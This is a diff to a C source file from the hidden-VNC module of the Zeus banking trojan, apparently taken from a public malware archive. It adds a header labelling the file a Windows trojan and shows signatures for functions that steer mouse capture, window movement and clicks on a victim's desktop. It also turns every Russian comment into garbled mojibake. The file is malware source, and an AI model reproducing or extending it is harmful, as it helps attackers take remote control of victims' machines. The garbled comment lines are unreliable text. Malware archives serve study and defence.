@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <ws2tcpip.h>
 #include <wininet.h>
@@ -14,16 +25,16 @@
 #if(BO_VNC > 0)
 
 /*
-  Изменение захваченого окна.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 
   IN OUT vncProcessData - VNCPROCESSDATA.
-  IN newTid             - новый TID.
-  IN newWindow          - новое окно.
-  IN newArea            - область захвата.
-  IN post               - true - высылать WM_CAPTURECHANGED через PostMessage.
-                          false - высылать WM_CAPTURECHANGED через SendMessage.
+  IN newTid             - пїЅпїЅпїЅпїЅпїЅ TID.
+  IN newWindow          - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
+  IN newArea            - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN post               - true - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ WM_CAPTURECHANGED пїЅпїЅпїЅпїЅпїЅ PostMessage.
+                          false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ WM_CAPTURECHANGED пїЅпїЅпїЅпїЅпїЅ SendMessage.
   
-  Return                - предыдущите захваченое окно.
+  Return                - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 */
 static HWND changeMouseCapture(VNCPROCESSDATA *vncProcessData, DWORD newTid, HWND newWindow, WORD newArea, bool post)
 {
@@ -45,7 +56,7 @@ static HWND changeMouseCapture(VNCPROCESSDATA *vncProcessData, DWORD newTid, HWN
 }
 
 /*
-  Перемещение текущего захваченого окна.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 
   IN OUT vncProcessData - VNCPROCESSDATA.
   IN x                  - X.
@@ -118,13 +129,13 @@ static void moveCapturedWindow(VNCPROCESSDATA *vncProcessData, LONG x, LONG y)
 }
 
 /*
-  Проверят сообщение на даблклик.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   IN OUT vncProcessData - VNCPROCESSDATA.
-  IN window             - окно.
-  IN message            - исходное сообщение.
+  IN window             - пїЅпїЅпїЅпїЅ.
+  IN message            - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return                - оригианльный message, или его даблклик.
+  Return                - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ message, пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static DWORD checkForDoubleClick(VNCPROCESSDATA *vncProcessData, HWND window, DWORD message)
 {
@@ -191,16 +202,16 @@ static DWORD checkForDoubleClick(VNCPROCESSDATA *vncProcessData, HWND window, DW
 }
 
 /*
-  Обработка события мыши.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 
   IN vncProcessData  - VNCPROCESSDATA.
-  IN window          - окно.
-  IN windowInfo      - данные об окне.
-  IN hiTest          - результат WM_NCHITTEST.
-  IN message         - сообщение для HTCLIENT.
-  IN ncMessage       - сообщение не для HTCLIENT.
-  IN clientCursorPos - клиентские координаты.
-  IN screenCursorPos - экарнные координаты.
+  IN window          - пїЅпїЅпїЅпїЅ.
+  IN windowInfo      - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ.
+  IN hiTest          - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ WM_NCHITTEST.
+  IN message         - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ HTCLIENT.
+  IN ncMessage       - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ HTCLIENT.
+  IN clientCursorPos - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN screenCursorPos - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void mouseEvent(VNCPROCESSDATA *vncProcessData, HWND window, const WINDOWINFO *windowInfo, WORD hitTest, DWORD message, DWORD ncMessage, LPARAM clientCursorPos, LPARAM screenCursorPos)
 {
@@ -389,8 +400,8 @@ void mouseMessage(VNCPROCESSDATA *vncProcessData, DWORD flags, LONG x, LONG y, D
   HWND window = Gui::_windowFromPoint(vncProcessData->globalData->cursorPoint, SENDMESSAGE_TIMEOUT, &hitTest);
   
   /*
-    Если окно вернуло HITTEST изменния размера, а бордюра у окна нет,
-    перененаправляем данные родителю.
+    пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ HITTEST пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ,
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   */
   if(hitTest >= HTSIZEFIRST && hitTest <= HTSIZELAST)
   {
